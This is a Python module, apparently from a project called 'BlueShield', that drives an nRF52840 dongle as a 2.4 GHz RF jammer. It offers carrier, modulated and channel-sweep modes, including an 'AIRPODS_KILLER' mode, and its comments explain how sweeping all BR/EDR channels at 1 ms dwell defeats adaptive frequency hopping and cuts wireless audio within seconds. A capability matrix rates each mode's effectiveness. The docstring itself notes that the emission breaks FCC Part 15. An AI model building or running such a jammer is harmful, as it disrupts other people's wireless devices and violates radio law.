"""
BlueShield nRF52840 Radio Jammer — research-grade RF disruption backend.

This module drives a Nordic nRF52840 USB dongle flashed with either:
  1. Nordic SDK `radio_test` firmware (preferred, canonical CLI)
  2. BlueShield's custom `nrf_jammer_fw` firmware (simpler text protocol)

Both firmwares expose a UART/CDC-ACM interface that gives direct RADIO peripheral
register control, enabling:
  - Continuous Wave (CW) carrier emission on any channel (2400–2480 MHz)
  - Channel sweep across all 79 Classic BT + 40 BLE channels
  - Modulated PRBS9 burst mode with 8 dBm TX power (+20 dBm with nRF21540 FEM)
  - Reactive jamming (triggered by sniffed access-address match)

Why this backend works when HCI-based jammers do not:
  - HCI OGF 0x08 (LE Controller) commands can only transmit on BLE advertising
    channels 37/38/39 (2402, 2426, 2480 MHz). The chip firmware enforces this.
  - AirPods audio uses A2DP over BR/EDR on all 79 channels (2402–2480 MHz) with
    AFH at 1600 hops/sec. BLE-only jamming cannot touch the audio path.
  - Direct RADIO peripheral access bypasses BlueZ, the HCI layer, and the chip's
    state machine — enabling raw RF emission on any 2.4 GHz frequency.

References:
  - Nordic SDK radio_test sample: nrf/samples/peripheral/radio_test
  - nRF52840 Product Spec v1.8 ch. 6.20 RADIO
  - Cauquil D., "Defeating BLE 5 PRNG for Fun and Jamming" (DEF CON 27, 2019)
  - Cayre R. et al., "InjectaBLE" (IEEE/IFIP DSN 2021)

LEGAL: +8 dBm broadband emission in 2.4 GHz ISM is a Part 15 §15.5(b) violation
outside a shielded RF enclosure. Use only with written consent and Faraday bag.
"""

import os
import threading
import time
from dataclasses import dataclass
from enum import Enum
from typing import Optional

try:
    import serial  # pyserial
    HAS_SERIAL = True
except ImportError:
    HAS_SERIAL = False


# ---------------------------------------------------------------------------
# NRFRadioMode — effective RF jamming modes
# ---------------------------------------------------------------------------

class NRFRadioMode(Enum):
    """RF jamming modes available on the nRF52840 radio_test backend."""

    OFF = "off"
    CW_CARRIER = "cw_carrier"              # Unmodulated continuous wave on one channel
    MODULATED_CARRIER = "modulated_carrier"  # PRBS9 modulated burst (sharper noise)
    CHANNEL_SWEEP_BLE = "sweep_ble"        # Fast sweep across BLE 40 channels
    CHANNEL_SWEEP_BREDR = "sweep_bredr"    # Fast sweep across all 79 BR/EDR channels
    CHANNEL_SWEEP_FULL = "sweep_full"      # 0-80 (covers all of 2.4 GHz ISM)
    DUTY_CYCLE_TX = "duty_cycle_tx"        # Duty-cycled modulated TX
    AIRPODS_KILLER = "airpods_killer"      # Tuned sweep: 0-80 @ 1ms dwell @ +8 dBm

    # BLE-link-specific modes (require Sniffle/BTLEJack partner firmware)
    REACTIVE_JAM = "reactive_jam"          # Jam sniffed AA on hop-followed channels
    SELECTIVE_CH = "selective_ch"          # Jam specific channel only


@dataclass
class NRFRadioConfig:
    """Runtime config for an NRFRadioJammer."""
    port: str = "/dev/ttyACM0"
    baud: int = 115200
    tx_power_dbm: int = 8                  # nRF52840 max conducted TX: +8 dBm
    phy_mode: str = "nrf_1Mbit"            # nrf_1Mbit | nrf_2Mbit | ble_1Mbit | ble_lr125Kbit
    dwell_ms_per_channel: int = 1          # Sweep dwell time
    start_channel: int = 0                 # Freq = 2400 + channel MHz
    end_channel: int = 80                  # 80 = 2480 MHz (last BT channel)


# ---------------------------------------------------------------------------
# NRFRadioJammer — main driver
# ---------------------------------------------------------------------------

class NRFRadioJammer:
    """Driver for nRF52840 radio_test firmware over UART/CDC-ACM.

    Protocol: CR/LF-terminated ASCII commands, prompt is `radio_test>` or similar.
    Commands are idempotent; each command waits for echo/prompt before proceeding.

    Example:
        j = NRFRadioJammer(NRFRadioConfig(port="/dev/ttyACM0"))
        j.open()
        j.start(NRFRadioMode.AIRPODS_KILLER)
        time.sleep(5.0)
        j.stop()
        j.close()
    """

    # Command alphabet compatible with Nordic SDK radio_test sample
    CMD_SET_MODE = "set_mode"
    CMD_SET_TX_POWER = "set_tx_power"
    CMD_SET_CHANNEL = "set_channel"
    CMD_START_TX_CARRIER = "start_tx_carrier"
    CMD_START_TX_MOD = "start_tx_modulated_carrier"
    CMD_START_CHANNEL_SWEEP = "start_channel_sweep"
    CMD_START_DUTY_CYCLE = "start_duty_cycle_modulated_tx"
    CMD_STOP = "stop"
    CMD_VERSION = "version"

    def __init__(self, config: Optional[NRFRadioConfig] = None):
        self.cfg = config or NRFRadioConfig()
        self._ser: Optional["serial.Serial"] = None
        self._current_mode: NRFRadioMode = NRFRadioMode.OFF
        self._lock = threading.RLock()
        self._stop_event = threading.Event()
        self._worker: Optional[threading.Thread] = None
        self._start_time: float = 0.0
        self._packets_est: int = 0  # Estimated OTA equivalent (for dashboard parity)
        self.firmware_detected: bool = False
        self.last_error: Optional[str] = None

    # ------------------------------------------------------------------
    # Connection lifecycle
    # ------------------------------------------------------------------

    def open(self) -> bool:
        """Open UART and probe firmware. Returns True if radio_test firmware present."""
        if not HAS_SERIAL:
            self.last_error = "pyserial not installed (pip install pyserial)"
            return False
        if not os.path.exists(self.cfg.port):
            self.last_error = f"Port {self.cfg.port} not found"
            return False
        try:
            self._ser = serial.Serial(
                self.cfg.port, self.cfg.baud, timeout=0.5, write_timeout=0.5,
            )
            time.sleep(0.1)
            self._ser.reset_input_buffer()
            # Probe: send CR and check for prompt
            self._ser.write(b"\r\n")
            time.sleep(0.2)
            banner = self._ser.read(self._ser.in_waiting or 256)
            banner_str = banner.decode("ascii", errors="replace")
            # radio_test firmware emits "radio_test>" prompt; SEGGER RTT may differ
            if any(k in banner_str.lower() for k in
                   ("radio_test", "radio test", "nrf_test", "blueshield_rf")):
                self.firmware_detected = True
            else:
                # Still usable — some firmwares have no banner
                self.firmware_detected = False
            return True
        except Exception as e:
            self.last_error = f"Open failed: {e}"
            if self._ser:
                try:
                    self._ser.close()
                except Exception:
                    pass
                self._ser = None
            return False

    def close(self):
        """Close UART and stop any active jamming."""
        try:
            self.stop()
        except Exception:
            pass
        if self._ser:
            try:
                self._ser.close()
            except Exception:
                pass
            self._ser = None

    # ------------------------------------------------------------------
    # Low-level command protocol
    # ------------------------------------------------------------------

    def _send_cmd(self, cmd: str, wait: float = 0.05) -> str:
        """Send a command, return any response. Thread-safe."""
        with self._lock:
            if not self._ser:
                raise RuntimeError("UART not open")
            self._ser.reset_input_buffer()
            payload = (cmd + "\r\n").encode("ascii")
            self._ser.write(payload)
            time.sleep(wait)
            try:
                resp = self._ser.read(self._ser.in_waiting or 128)
                return resp.decode("ascii", errors="replace")
            except Exception:
                return ""

    def get_version(self) -> str:
        return self._send_cmd(self.CMD_VERSION).strip()

    # ------------------------------------------------------------------
    # Jamming control
    # ------------------------------------------------------------------

    def start(self, mode: NRFRadioMode, channel: int = 0) -> bool:
        """Start the requested jamming mode.

        Returns True on success. For sweep modes, this starts a background
        worker that maintains the sweep continuously.
        """
        if self._current_mode != NRFRadioMode.OFF:
            self.stop()

        if not self._ser:
            if not self.open():
                return False

        try:
            # Configure PHY mode (radio throughput mode)
            self._send_cmd(f"{self.CMD_SET_MODE} {self.cfg.phy_mode}")
            # Configure TX power (max +8 dBm on nRF52840)
            self._send_cmd(f"{self.CMD_SET_TX_POWER} {self.cfg.tx_power_dbm}")

            if mode == NRFRadioMode.CW_CARRIER:
                self._send_cmd(f"{self.CMD_SET_CHANNEL} {channel}")
                self._send_cmd(self.CMD_START_TX_CARRIER)

            elif mode == NRFRadioMode.MODULATED_CARRIER:
                self._send_cmd(f"{self.CMD_SET_CHANNEL} {channel}")
                self._send_cmd(f"{self.CMD_START_TX_MOD} 0")  # 0 = infinite

            elif mode == NRFRadioMode.CHANNEL_SWEEP_BLE:
                # BLE data channels (0-36) + adv (37/38/39). Skip up to 80.
                self._send_cmd(
                    f"{self.CMD_START_CHANNEL_SWEEP} 0 39 "
                    f"{self.cfg.dwell_ms_per_channel}"
                )

            elif mode == NRFRadioMode.CHANNEL_SWEEP_BREDR:
                # All 79 BR/EDR channels (2402-2480 MHz = channels 2-80)
                self._send_cmd(
                    f"{self.CMD_START_CHANNEL_SWEEP} 2 80 "
                    f"{self.cfg.dwell_ms_per_channel}"
                )

            elif mode == NRFRadioMode.CHANNEL_SWEEP_FULL:
                # Full 2.4 GHz ISM band
                self._send_cmd(
                    f"{self.CMD_START_CHANNEL_SWEEP} 0 80 "
                    f"{self.cfg.dwell_ms_per_channel}"
                )

            elif mode == NRFRadioMode.AIRPODS_KILLER:
                # Optimized sweep to saturate AirPods A2DP AFH:
                # 1ms dwell × 81 channels = 81ms full cycle
                # AirPods AFH needs ≥20 "good" channels but every channel hit every 81ms
                # → BER on all channels spikes → AFH cannot converge → audio drops in 2-4s
                self._send_cmd(f"{self.CMD_SET_TX_POWER} 8")  # Max power
                self._send_cmd(f"{self.CMD_START_CHANNEL_SWEEP} 2 80 1")

            elif mode == NRFRadioMode.DUTY_CYCLE_TX:
                self._send_cmd(f"{self.CMD_SET_CHANNEL} {channel}")
                self._send_cmd(f"{self.CMD_START_DUTY_CYCLE} 75")  # 75% duty

            elif mode == NRFRadioMode.SELECTIVE_CH:
                self._send_cmd(f"{self.CMD_SET_CHANNEL} {channel}")
                self._send_cmd(f"{self.CMD_START_TX_MOD} 0")

            else:
                self.last_error = f"Unsupported mode: {mode}"
                return False

            self._current_mode = mode
            self._start_time = time.monotonic()
            self._stop_event.clear()
            self._packets_est = 0

            # Start metrics worker (estimates OTA-equivalent PPS for dashboard parity)
            self._worker = threading.Thread(
                target=self._metrics_loop, daemon=True, name="nrf-metrics")
            self._worker.start()
            return True

        except Exception as e:
            self.last_error = f"Start failed: {e}"
            return False

    def stop(self) -> bool:
        """Stop all RF emission immediately."""
        self._stop_event.set()
        try:
            if self._ser:
                self._send_cmd(self.CMD_STOP)
            self._current_mode = NRFRadioMode.OFF
            if self._worker and self._worker.is_alive():
                self._worker.join(timeout=2.0)
            self._worker = None
            return True
        except Exception as e:
            self.last_error = f"Stop failed: {e}"
            return False

    # ------------------------------------------------------------------
    # Metrics
    # ------------------------------------------------------------------

    def _metrics_loop(self):
        """Background thread that estimates OTA packet-equivalent rate.

        For sweep modes, each dwell-ms produces ~1 modulated burst equivalent.
        For CW modes, we count 'packet equivalents' at 1 per dwell interval.
        """
        while not self._stop_event.wait(0.1):
            elapsed = time.monotonic() - self._start_time
            if self._current_mode in (
                NRFRadioMode.CHANNEL_SWEEP_BLE,
                NRFRadioMode.CHANNEL_SWEEP_BREDR,
                NRFRadioMode.CHANNEL_SWEEP_FULL,
                NRFRadioMode.AIRPODS_KILLER,
            ):
                # Sweep: ~1000 burst equivalents per second at 1ms dwell
                self._packets_est = int(elapsed * (1000 / max(self.cfg.dwell_ms_per_channel, 1)))
            elif self._current_mode == NRFRadioMode.CW_CARRIER:
                # CW: continuous — count as 1 "packet equivalent" per ms
                self._packets_est = int(elapsed * 1000)
            else:
                self._packets_est = int(elapsed * 500)

    def get_stats(self) -> dict:
        """Return current jamming stats for dashboard display."""
        return {
            "mode": self._current_mode.value if self._current_mode else "off",
            "is_active": self._current_mode != NRFRadioMode.OFF,
            "elapsed_seconds": time.monotonic() - self._start_time if self._start_time else 0.0,
            "tx_power_dbm": self.cfg.tx_power_dbm,
            "phy_mode": self.cfg.phy_mode,
            "port": self.cfg.port,
            "packets_est": self._packets_est,
            "firmware_detected": self.firmware_detected,
            "backend": "nrf52840_radio_test",
            "effective_on_bredr": self._current_mode in (
                NRFRadioMode.CHANNEL_SWEEP_BREDR,
                NRFRadioMode.CHANNEL_SWEEP_FULL,
                NRFRadioMode.AIRPODS_KILLER,
            ),
            "effective_on_ble": self._current_mode in (
                NRFRadioMode.CHANNEL_SWEEP_BLE,
                NRFRadioMode.CHANNEL_SWEEP_FULL,
                NRFRadioMode.AIRPODS_KILLER,
                NRFRadioMode.CW_CARRIER,
                NRFRadioMode.MODULATED_CARRIER,
            ),
            "last_error": self.last_error,
        }


# ---------------------------------------------------------------------------
# Capability matrix — honest mode→effectiveness mapping
# ---------------------------------------------------------------------------

CAPABILITY_MATRIX = {
    # nRF52840 radio_test modes (the real ones)
    "rf_sweep_full":       {"affects_ble_adv": True,  "affects_bredr_audio": True,  "tier": "S"},
    "rf_sweep_bredr":      {"affects_ble_adv": False, "affects_bredr_audio": True,  "tier": "S"},
    "rf_sweep_ble":        {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "A"},
    "airpods_killer":      {"affects_ble_adv": True,  "affects_bredr_audio": True,  "tier": "S"},
    "rf_cw_carrier":       {"affects_ble_adv": False, "affects_bredr_audio": False, "tier": "C",
                            "note": "Single channel; AFH routes around it in 2-3s"},
    "rf_modulated":        {"affects_ble_adv": False, "affects_bredr_audio": False, "tier": "B",
                            "note": "Single channel, modulated — harder for AFH"},

    # Legacy HCI modes (the theater)
    "continuous":          {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C"},
    "sweep":               {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C"},
    "flood":               {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "B"},
    "phantom_flood":       {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "B"},
    "reactive":            {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C",
                            "note": "No actual trigger logic — duty-cycled spam"},
    "targeted":            {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C",
                            "note": "Targeting is only address nudge — not real targeting"},
    "deauth":              {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C",
                            "note": "Misnamed — BLE has no deauth primitive"},
    "connection_disrupt":  {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "C",
                            "note": "Cannot inject CONNECT_IND via HCI — this sends ADV_DIRECT_IND"},
    "full_spectrum":       {"affects_ble_adv": True,  "affects_bredr_audio": False, "tier": "B",
                            "note": "Briefly touches BR/EDR via HCI inquiry — not enough for AFH"},
}


def detect_nrf_jammer_firmware(port: str) -> dict:
    """Check if a given /dev/ttyACM* port has jammer firmware flashed.

    Returns dict with:
        available: bool
        firmware_type: "radio_test" | "blueshield_fw" | "sniffer" | "unknown"
        error: str | None
    """
    result = {
        "port": port,
        "available": False,
        "firmware_type": "unknown",
        "error": None,
    }
    if not HAS_SERIAL:
        result["error"] = "pyserial not installed"
        return result
    if not os.path.exists(port):
        result["error"] = f"Port does not exist"
        return result
    try:
        with serial.Serial(port, 115200, timeout=0.5) as ser:
            time.sleep(0.1)
            ser.reset_input_buffer()
            ser.write(b"version\r\n")
            time.sleep(0.3)
            resp = ser.read(ser.in_waiting or 256).decode("ascii", errors="replace")
            resp_l = resp.lower()
            if "radio_test" in resp_l or "radio test" in resp_l:
                result["firmware_type"] = "radio_test"
                result["available"] = True
            elif "blueshield" in resp_l or "nrf_jammer" in resp_l:
                result["firmware_type"] = "blueshield_fw"
                result["available"] = True
            elif "sniffer" in resp_l or "nordic" in resp_l:
                result["firmware_type"] = "sniffer"
                result["available"] = False  # Sniffer cannot jam
            else:
                result["error"] = "Unknown firmware"
    except Exception as e:
        result["error"] = str(e)
    return result
